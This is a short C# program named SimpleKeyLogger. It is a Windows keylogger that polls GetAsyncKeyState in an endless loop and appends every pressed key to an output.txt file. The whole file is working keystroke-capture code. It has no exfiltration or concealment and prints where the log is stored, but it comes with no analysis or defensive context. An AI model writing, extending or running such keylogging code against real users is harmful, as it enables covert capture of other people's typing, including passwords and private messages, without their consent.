using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace SimpleKeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static void Main()
        {
            string path = Environment.CurrentDirectory;
            path = path.Remove(path.LastIndexOf('\\'));
            path = path.Remove(path.LastIndexOf('\\'));
            path = path.Remove(path.LastIndexOf('\\'));
            path = path + @"\output.txt";

            Console.WriteLine($"logged keys are down in {path}");


            Console.OutputEncoding = System.Text.Encoding.UTF8;

            try
            {
                File.Delete(path);
            }
            catch (Exception e)
            {

            }
            finally
            {
                using (StreamWriter sc = File.CreateText(path))
                {

                }
            }
            while (true)
            {
                Thread.Sleep(150);

                for (int i = 1; i <= 32700; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        using (StreamWriter sc = File.AppendText(path))
                        {
                            sc.Write((System.ConsoleKey)i);
                        }
                    }
                }
            }
        }
    }
}
